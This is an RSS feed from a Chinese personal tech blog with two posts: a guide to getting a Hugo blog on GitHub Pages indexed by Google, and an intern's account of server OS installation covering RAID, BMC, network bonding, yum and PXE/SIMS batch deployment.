<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>其他 on 茄子的养殖场</title>
        <link>https://proben1.github.io/tags/%E5%85%B6%E4%BB%96/</link>
        <description>Recent content in 其他 on 茄子的养殖场</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Sat, 27 Jul 2024 15:41:45 +0800</lastBuildDate><atom:link href="https://proben1.github.io/tags/%E5%85%B6%E4%BB%96/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>让Google搜索到搭建在GithubPages上的博客</title>
        <link>https://proben1.github.io/2024/%E8%AE%A9google%E6%90%9C%E7%B4%A2%E5%88%B0%E6%90%AD%E5%BB%BA%E5%9C%A8githubpages%E4%B8%8A%E7%9A%84%E5%8D%9A%E5%AE%A2/</link>
        <pubDate>Sat, 27 Jul 2024 15:41:45 +0800</pubDate>
        
        <guid>https://proben1.github.io/2024/%E8%AE%A9google%E6%90%9C%E7%B4%A2%E5%88%B0%E6%90%AD%E5%BB%BA%E5%9C%A8githubpages%E4%B8%8A%E7%9A%84%E5%8D%9A%E5%AE%A2/</guid>
        <description>&lt;p&gt;将Hugo博客框架和Github Pages结合起来搭建博客是一种很不错的选择，但是如果仅仅搭建完毕是无法通过搜索引擎查询到的，因为搜索引擎不会去检索你的Github仓库，遇到这个问题怎么办呢？本文教你用Hugo在Github Pages上搭建的博客如何能被Google搜索到。&lt;/p&gt;
&lt;h2 id=&#34;查看是否被收录&#34;&gt;查看是否被收录
&lt;/h2&gt;&lt;p&gt;首先查看你的博客地址是否已经被Google收录，在Google的搜索栏中搜索：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;site:http://xxxx.github.io
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果没有结果，那么先添加收录&lt;/p&gt;
&lt;p&gt;如果只有主页面，那么添加站点地图&lt;/p&gt;
&lt;h2 id=&#34;搜索资源提交&#34;&gt;搜索资源提交
&lt;/h2&gt;&lt;p&gt;进入Google  &lt;a class=&#34;link&#34; href=&#34;https://www.google.com/webmasters/tools/home?hl=zh-CN&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Search Console&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;在添加资源中，选择网址前缀验证&lt;/p&gt;
&lt;p&gt;选择&lt;strong&gt;备用方法&lt;/strong&gt;中的HTML标记方式来验证&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/66a4a642d9c307b7e979c095.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/66a4a642d9c307b7e979c095.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Google会给出一个html的标识，你需要在博客根目录下的static文件夹里创建一个和该html同名的文件夹，并把这个html标识复制到文件夹内，更名为index.html&lt;/p&gt;
&lt;p&gt;更新你的目录，完成验证。&lt;/p&gt;
&lt;h2 id=&#34;编制索引&#34;&gt;编制索引
&lt;/h2&gt;&lt;p&gt;进入Google  &lt;a class=&#34;link&#34; href=&#34;https://www.google.com/webmasters/tools/home?hl=zh-CN&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Search Console&lt;/a&gt; 中的网址检查里，对网址完成检查，并点击请求编入索引：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/66a4a728d9c307b7e97a7d59.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/66a4a728d9c307b7e97a7d59.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;站点地图&#34;&gt;站点地图
&lt;/h2&gt;&lt;p&gt;进入Google  &lt;a class=&#34;link&#34; href=&#34;https://www.google.com/webmasters/tools/home?hl=zh-CN&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Search Console&lt;/a&gt; 中的站点地图里，添加站点地图，hugo默认的地图是xml格式，直接在后缀添加即可。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/66a4a79cd9c307b7e97ad6e0.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/66a4a79cd9c307b7e97ad6e0.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>装系统之从0到100</title>
        <link>https://proben1.github.io/2024/%E8%A3%85%E7%B3%BB%E7%BB%9F%E4%B9%8B%E4%BB%8E0%E5%88%B0100/</link>
        <pubDate>Tue, 28 May 2024 19:31:18 +0800</pubDate>
        
        <guid>https://proben1.github.io/2024/%E8%A3%85%E7%B3%BB%E7%BB%9F%E4%B9%8B%E4%BB%8E0%E5%88%B0100/</guid>
        <description>&lt;img src="https://proben1.github.io/2024/%E8%A3%85%E7%B3%BB%E7%BB%9F%E4%B9%8B%E4%BB%8E0%E5%88%B0100/%E6%95%B4%E4%BD%93%E7%8E%AF%E5%A2%83.jpg" alt="Featured image of post 装系统之从0到100" /&gt;&lt;p&gt;仅作为个人成长的记录。内容为三次装机实践的过程和一些总结。&lt;/p&gt;
&lt;h2 id=&#34;零&#34;&gt;零
&lt;/h2&gt;&lt;p&gt;实习不到一周，第一个任务来了，让我们去机房装个系统练手。初到机房，一切都很新鲜：嗡嗡的风扇声、错综复杂的排线、柜子上摆着一列列的大方块。Leader指了指一个柜子，五个服务器静静躺在上面，“硬件可能有问题，你们自己检查，哪里坏了可以换，把服务器装好，下周我来检查。“于是几个一脸懵的小可爱开始苦哈哈的蹲机房捣鼓。&lt;/p&gt;
&lt;h3 id=&#34;硬件报错风波&#34;&gt;硬件报错风波
&lt;/h3&gt;&lt;p&gt;服务器是DELL的，刚好五个电源，我们一人插一个，还在找开机按钮呢，就看到上面的小显示屏滚动起了字符：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hwc2002 system board Riser cable or interconnect failure .  Check connection.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(Hwc2002系统板riser线缆或互连故障。检查连接。)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;unavailable in standby.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(待机不可用。)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PSU003 Power input for  PSU 1 is lost .Check PSU cables.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(PSU003电源模块1输入丢失检查电源线缆。)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;当时心中就是一咯噔，上网搜了下23是因为只插了一个电源的原因，一般服务器都有两个电源，1我不知道，于是下电开盖查看，。由于不知道什么是hwc2002，我最后只能观摩观摩服务器里头啥构造，并且。。。。。。卸了一个内存条，然后（特别）费力地把它再按回去，并拍了一张照片留念：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/66592ac6d9c307b7e93c1eaf.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/66592ac6d9c307b7e93c1eaf.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;（太巧了刚好是个错误示范）上面插的黑色塑料片是占位置用的，绿色是内存，现在来看我重插的内存很明显连在了一块，是有问题的。Dell服务器内存安装按照颜色的顺序进行插： 白色、黑色、绿色。最后经过了开机自检的重大报错之后，我联想到了我对内存所做的不可告人的操作，并再次（特别）费力的把它重新插会白色凹槽。&lt;/p&gt;
&lt;h3 id=&#34;安装系统&#34;&gt;安装系统
&lt;/h3&gt;&lt;p&gt;经过了彻彻底底的人为制造错误之后，我决定跳过这些直接进到安装操作系统。但是事情真的有这么简单吗？最开始我的思路是这样的：需要一个USB做启动盘，狂按F几键进入从USB启动，安装，搞定！但是系统在启动原先系统失败后进入了boot菜单，我迷路了。。。。。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/66593287d9c307b7e943f954.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/66593287d9c307b7e943f954.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;于是，它显示的每个按钮我都按了按，在BIOS丛林探索了一小时（一半时间都是在等自检），我终于走到了终点，那个让我欣喜若狂的界面——系统安装。我快速的配置好了支持语言、时区、安装模式，等到分配磁盘的时候、、、显示没有空间！！！我蒙了，于是开始反思换个硬盘的必要。这时善良的同事提醒了我：需要做RAID。&lt;/p&gt;
&lt;p&gt;磁盘阵列（Redundant Arrays of Independent Disks，RAID），由很多块独立的磁盘，组合成一个容量巨大的磁盘组，通过把数据放在多个硬盘上，既能条带化地提升性能，又可以作为冗余。不同服务器进入配置菜单的方式不一样，这里需要在自检后通过Ctrl+R的方式进入RAID配置。我删除了原来的逻辑分组，新建了一个逻辑组，在这个过程中它会进行快速初始化，再进入操作系统安装界面之后，就有磁盘空间了。&lt;/p&gt;
&lt;h3 id=&#34;网络&#34;&gt;网络
&lt;/h3&gt;&lt;p&gt;完成了安装之后，就进入了操作系统（这里有个伏笔，我没有思考它是怎么进到操作系统的）。以为万事大吉？No no no，还有后续很多软件的安装还有一些优化的配置，难道我们要一直在这里蹲着手敲？这时候就需要连上自己的电脑。这里也有很多小问题，包括：插上网线了不知道下一步干啥、找不到自己电脑在哪里改以太网IP、服务器不知道插的是哪个网卡、配完忘重启网络以为又坏了。。。总之，最后成功ping到了自己电脑，可以ssh登录，值得小小庆祝一下。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/66593860d9c307b7e9491318.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/66593860d9c307b7e9491318.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;yum&#34;&gt;yum
&lt;/h3&gt;&lt;p&gt;已经跨过两座大山：装系统和配网络，接下来要安装环境了。首先要建立一个本地的yum源，但是我改怎么把镜像文件传过去呢？我先想到用usb直接挂载，复制过去。但是出现了windows和linux文件系统不兼容的问题，也就是封面搜索的那个问题。最后通过xftp网络了过去，速度还蛮快的。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/66593960d9c307b7e94a0317.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/66593960d9c307b7e94a0317.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;按照集成手册配置本地yum源，中途遇到了版本不同报错的问题，手动修改即可，最终yum list的成功显示一串串的软件包，当时成就感拉满。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#586e75;background-color:#eee8d5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;疯狂安装软件:yum install -y xxx
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;检测哪些没按上的:rpm -q xxx | grep not
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;之后就是配置/etc/profile，配置/etc/sysctl.conf，一步一步完成操作，因为不是生产环境所以有些步骤跳过了。&lt;/p&gt;
&lt;h3 id=&#34;检查&#34;&gt;检查
&lt;/h3&gt;&lt;p&gt;Leader发来了一个检测脚本，给777权限跑一下，最后结果如下：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/667934dfd9c307b7e9db7257.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/667934dfd9c307b7e9db7257.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可以看到上面大部分是服务和软件的问题，但是下面的检测结果就有点那啥了，单纯是看有没有这个文件，如果确实是实际环境，可以起到一个提醒的作用。但是但是练习环境下根本配不到这些啊喂~&lt;/p&gt;
&lt;p&gt;不管怎么说，总算费劲的给搞完了吼吼，我物理装机的第一部作品！&lt;/p&gt;
&lt;h2 id=&#34;壹&#34;&gt;壹
&lt;/h2&gt;&lt;p&gt;有个小任务，要装几台系统作为网络设备的测试平台，交给我们去安装系统，这次是浪潮的服务器。&lt;/p&gt;
&lt;h3 id=&#34;初见管理口&#34;&gt;初见管理口
&lt;/h3&gt;&lt;p&gt;服务器通常会有两种不同类型的网络接口，即管理口（Management Port）和网口（Ethernet Port），它们的作用和用途不同。&lt;/p&gt;
&lt;p&gt;管理口通常是用于服务器管理的网络接口，也被称为外带网卡或带外接口（Out-of-band Interface）。管理口与服务器主板上的 BMC（Baseboard Management Controller）或者其他管理卡相连，可以通过远程管理协议（例如IPMI、iDRAC、iLO等）进行远程管理和监控服务器。网口就是咱们平时正常用的网络接口。&lt;/p&gt;
&lt;p&gt;学长指导，可以通过内网直接访问到这几台服务器的带外口，我直接ssh连了上去。。。发现是一个看不懂的命令行，smartctl，没有办法像bash一样操作。试了几下，用浏览器访问这个ip，发现了新大陆——BMC页面，可以图形化的管理服务器硬件的状态，以及一个重要的功能：远程控制台。进到了远程控制台，相当于一个小显示屏，远程实时显示服务器的屏幕。&lt;/p&gt;
&lt;h3 id=&#34;安装系统-1&#34;&gt;安装系统
&lt;/h3&gt;&lt;p&gt;好奇宝宝们尝试用远程上传镜像媒体的方式安一下系统，结果这个速度一言难尽，20分种跑了几kb，遂放弃。（我们后来才知道，这个在进入系统安装界面的时候才会开始正常的上传）。&lt;/p&gt;
&lt;p&gt;所以最后还是选择了进到机房物理USB的方式安装。&lt;/p&gt;
&lt;h3 id=&#34;配置raid&#34;&gt;配置RAID
&lt;/h3&gt;&lt;p&gt;安装过程中理所当然的遇到了硬盘没空间的问题，需要初始化一下硬盘。这里就出现问题了。我在安好了操作系统之后，发现无论如何都无法进入系统，在一个地方反复徘徊检测。询问学长，可能是硬盘启动顺序设置不对的原因。于是我们进到BIOS启动顺序菜单进行查看。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6659436bd9c307b7e955061a.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6659436bd9c307b7e955061a.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;十分不幸，BIOS启动顺序菜单只能把所有硬盘当成一个整体进行启动，那么不同硬盘之间呢？和同事对比了之后，进入了raid管理界面，简单分析一下：&lt;/p&gt;
&lt;p&gt;原本服务器里有两个480GRAID1的系统盘，组成了一个逻辑盘组，排在启动顺序第一位；12个1.2T的数据盘，组成了令一个逻辑盘组，排在启动顺序第二位。因为我初始化系统盘的时候，不是直接原地初始化，而是删除了逻辑盘组再新建。删除了之后第二个逻辑盘组顺位到第一启动位，所以新建的逻辑盘组只能排在第二。在调整好硬盘的启动顺序之后，可以正常进入系统。&lt;/p&gt;
&lt;h3 id=&#34;配置网卡&#34;&gt;配置网卡
&lt;/h3&gt;&lt;p&gt;需求是将两个万兆网卡做双网卡绑定，哪个是万兆网卡可以在装系统时的network里查看。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/66596425d9c307b7e976a474.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/66596425d9c307b7e976a474.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;但是注意！！！不要在图形化界面里配置网络，老老实实进到系统vi /etc/sysconfig/network-scripts/里配置，不然可能出现不可预料的后果（同事的血泪教训）。以及后面的restart不要把network和NetworkManager混用。&lt;/p&gt;
&lt;p&gt;完成了双网卡绑定的配置之后，这里暂时告一段落。&lt;/p&gt;
&lt;h2 id=&#34;佰&#34;&gt;佰
&lt;/h2&gt;&lt;p&gt;新任务，工作实战课题，去ZTE的滨江园区进行预装。滨江园区，比较大，规矩也比较多，是不一样的环境。两批服务器，分别是利比亚和利比里亚的，需要从裸机到安装操作系统。共计45+38台&lt;/p&gt;
&lt;p&gt;首先说下为什么要去园区吧，因为园区有着一个完整的供应链。ZTE的对外业务包括语音核心网，我们的计费处理是其中的一环。
预安装需要为境外项目服务，第一是可以节省项目的时间。一些服务器和环境被预先配置好，这样到现场可以立即开始使用。第二是可以检查硬件的可使用性，相当于提前对设备能否正常运行做的一次测验。这样现场再出现问题，可以定位到问题在哪里出现，比如运输途中损坏，更有利于后续的鉴定。&lt;/p&gt;
&lt;p&gt;此外预安装还可以减少一部分项目现场的成本。不过总的来说还是为了境外项目可以更快更好的完成。&lt;/p&gt;
&lt;p&gt;机架长这样（照片是ZTE的人拍的）&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/665999abd9c307b7e9b309ba.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/665999abd9c307b7e9b309ba.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&#34;触摸服务器&#34;&gt;触摸服务器
&lt;/h3&gt;&lt;p&gt;拆开防尘盖查看服务器，进行辨识。&lt;/p&gt;
&lt;p&gt;服务器前面板：品牌标识、状态指示灯、存储硬盘（很大一排）&lt;/p&gt;
&lt;p&gt;内部：主板、CPU两个（可numa），内存条（需要按正确顺序颜色安装）、风扇、防尘盖&lt;/p&gt;
&lt;p&gt;后面板：千兆网卡（4口），万兆网卡（2口），480G系统硬盘，电源&lt;/p&gt;
&lt;h3 id=&#34;前期准备&#34;&gt;前期准备
&lt;/h3&gt;&lt;p&gt;我认为前期是做准备工作，指的是不在现场就可以完成的任务，保证现场工作可以高效率无阻碍的执行。主要进行项目分析、资源准备、设备清点单和安装规划等工作。&lt;/p&gt;
&lt;h4 id=&#34;1-所内准备&#34;&gt;1. 所内准备
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;提交外出申请，确保自己出勤。&lt;/li&gt;
&lt;li&gt;与同事进行工作交接，确保没有其他紧急任务或依赖项未解决。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;2-所外准备&#34;&gt;2. 所外准备
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;提前联系机房管理员，确保能够顺利进入机房。&lt;/li&gt;
&lt;li&gt;提前联系设备交接人，了解设备存放位置、运达情况、机房环境等信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;3-文件准备&#34;&gt;3. 文件准备
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;深入掌握项目的背景、目标、设备配置要求。&lt;/li&gt;
&lt;li&gt;准备详细的&lt;code&gt;设备清点单&lt;/code&gt;，包括设备型号、数量、配件等。&lt;/li&gt;
&lt;li&gt;准备&lt;code&gt;项目规划表&lt;/code&gt;，规划不同服务器不同的功能，规划好IP。&lt;/li&gt;
&lt;li&gt;根据项目需求制定项目&lt;code&gt;SIMS部署表&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;根据项目需求制定&lt;code&gt;时间规划表&lt;/code&gt;，确保工作进度，及时反馈。&lt;/li&gt;
&lt;li&gt;准备必要的安装工具、测试工具（自己电脑上的镜像、ssh软件、cPing等等）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当然，这些只是我最后的总结，实际上都不是我做的hhhhhh，我负责打杂+体力劳动+学习记录~&lt;/p&gt;
&lt;h3 id=&#34;中期执行&#34;&gt;中期执行
&lt;/h3&gt;&lt;p&gt;中期就是接触到服务器了，从清点设备收集信息到安装系统和软件，中期应该是耗时最长的。&lt;/p&gt;
&lt;h4 id=&#34;1-设备清点与分类&#34;&gt;1. 设备清点与分类
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;依照：设备清点单、设备型号&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;交换机和防火墙：清点主设备，电源，风扇，光模块，尤其注意光模块单模多模和速率&lt;/p&gt;
&lt;p&gt;服务器：清点主机型号，CPU，网卡，内存，硬盘。包括硬盘类型，大小，型号，数量。网卡主要看接口。内存和CPU可在加电后进行查看。&lt;/p&gt;
&lt;p&gt;主要通过主机型号、网卡接口、硬盘类型，大小，型号，数量，区分主机应用。其中，需要物理将PR主机和DR主机进行布局上的调整，并将区分好的主机前后贴上作用标签。&lt;/p&gt;
&lt;p&gt;服务器清点时发现两台服务器型号统计反了，但是一台已经装好了系统并配好了IP，需要修改IP和主机名。我直接vi修改了相应网卡的配置文件并配合&lt;code&gt;systemctl restart NetworkManager&lt;/code&gt;重启网络服务，检查过程中发现之前和现在的ip同时存在。reboot一下就好了，我才发现network与NetworkManager是差别的。&lt;/p&gt;
&lt;h4 id=&#34;2-配置管理口&#34;&gt;2. 配置管理口
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;收集每台主机的SN号和之后要用到的数据口的MAC地址，记录到预安装的规划表中。&lt;/li&gt;
&lt;li&gt;使用原始密码和原始IP登录每台主机，修改主机名、管理口IP等配置。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;3-bios配置&#34;&gt;3. BIOS配置
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;多线程模式&lt;/li&gt;
&lt;li&gt;Max&amp;ndash;Performance模式&lt;/li&gt;
&lt;li&gt;系统盘RAID1配置&lt;/li&gt;
&lt;li&gt;启动顺序配置，先硬盘再PXE&lt;/li&gt;
&lt;li&gt;保存并退出&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;因为服务器对外管理口默认网段和我们计划的网段不一致，修改后需要重新配置电脑IP，这里有个小妙招：在网络共享中心配置IP时，点“高级”，添加新网段的IP，这样可以同时访问多个网段（原理和昨天的配置路由不同），比较方便。化身多线程大师！&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/66793574d9c307b7e9dc6853.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/66793574d9c307b7e9dc6853.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h4 id=&#34;4sims部署&#34;&gt;4.SIMS部署
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;选取并安装种子机&lt;/li&gt;
&lt;li&gt;部署SIMS&lt;/li&gt;
&lt;li&gt;计划好每批部署多少台，填写SIMS部署表，上传&lt;/li&gt;
&lt;li&gt;确认客户端服务器网线连接无误、数据无误后，启动SIMS批量部署&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SIMS一键部署工具为IAAS平台自动化部署工具，用户通过向SIMS一键部署工具中导入平台规划数据，SIMS一键部署工具将全自动的部署操作系统及平台软件。在平台设施构建阶段，为用户节省大量时间并提供标准化的软件输出。&lt;/p&gt;
&lt;p&gt;至于怎么部署SIMS，这确实是我没有接触过的事情，涉及到docker相关，但是我在重装种子机的时候，看到了作为SIMS部署系统里相关的压缩包，推测是相关压缩包+命令的手册进行种子机的部署。与其知道怎么部署SIMS，不如了解一下SIMS的原理。&lt;/p&gt;
&lt;p&gt;原理：部署信息表+对外管理口+PXE&lt;/p&gt;
&lt;p&gt;部署信息表就是列出了相关配置，什么系统装什么，mac是什么，对外口的账号密码是什么，然后通过命令模式，在外操控对外口、进PXE，在内安装操作系统和配置，都是预先的命令。&lt;/p&gt;
&lt;h5 id=&#34;pxe&#34;&gt;PXE
&lt;/h5&gt;&lt;p&gt;PXE(Pre-boot Execution Environment)，可以使计算机通过网络启动，也是厂商默认和推荐的方式。分为 client和server两端，服务端就是种子机，客户端就是等待安装的机器。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;开机后，客户端计算机的网卡BIOS将广播DHCP请求，以获取一个IP地址。&lt;/li&gt;
&lt;li&gt;DHCP服务器响应客户端的DHCP请求，并提供了IP地址、子网掩码、默认网关、TFTP（Trivial File Transfer Protocol）服务器地址和启动文件名等信息。&lt;/li&gt;
&lt;li&gt;客户端使用TFTP协议从TFTP服务器加载启动文件。负责为客户端计算机准备启动环境，包括连接到远程安装服务器等。&lt;/li&gt;
&lt;li&gt;启动加载程序执行后，客户端将从安装服务器下载并加载完整的操作系统安装映像文件。&lt;/li&gt;
&lt;li&gt;安装程序执行，引导用户完成操作系统的安装过程。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;种子机充当DHCP服务器，引导客户端的PXE流程：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6659b0e9d9c307b7e9cd21dd.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6659b0e9d9c307b7e9cd21dd.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;至于这个装系统，要是流畅的话会爽到什么程度，我只能说如下：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6659b173d9c307b7e9cdb8ba.png&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6659b173d9c307b7e9cdb8ba.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;一个个都是命令形式，完全没有图形化界面，分磁盘的规划都是复制粘贴上去的。but，代价是什么？？&lt;/p&gt;
&lt;p&gt;代价是。。。调试。主要是不断的操作，不断的出错，不断的排查并继续操作。最开始设置的只有硬盘boot，但是一直卡在no boot device，推测一直卡在硬盘这里，没有激活PXE（理论上是可以自动激活一次的）。只能手动去调这个了，也就是说利比亚的机器需要再统一改一次BIOS才能SIMS集体安装。调试好了之后，可以用SIMS自动部署。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/667935fad9c307b7e9de5d37.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/667935fad9c307b7e9de5d37.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;还出现了已经进入PEX模式，准备进行操作系统安装，但是卡住不动，需要手动选择版本与内核，同时接下来需要手动在文字界面安装操作系统的情况，&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;解决思路：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1、对比sims安装表里是否有ip、mac、主机名等等的错误，经过对比后没有发现错误&lt;/p&gt;
&lt;p&gt;2、通过&lt;code&gt;docker exec -ti $(docker ps | grep pxe | awk &#39;{print $1}&#39;) bash&lt;/code&gt;命令进入种子机里pxe的docker，跑到&lt;code&gt;/var/lib/tftpboot/pxelinux.cfg&lt;/code&gt;中查看是否有对应mac地址的文件，发现确实有（图左），但是无法查看。而通过&lt;code&gt;cat 58-53-c0-94-17-46\&lt;/code&gt;命令反而可以查看，于是发现文件名后面是一个空格，真相大白。&lt;/p&gt;
&lt;p&gt;3、将这批机器换到下一批重新安装，修改表中的所有mac地址，删去后面的空格，同时仔细检查。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原理：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在空格前加上反斜杠（\），告诉shell这个空格是文件名的一部分，而不是命令参数的分隔符。&lt;/p&gt;
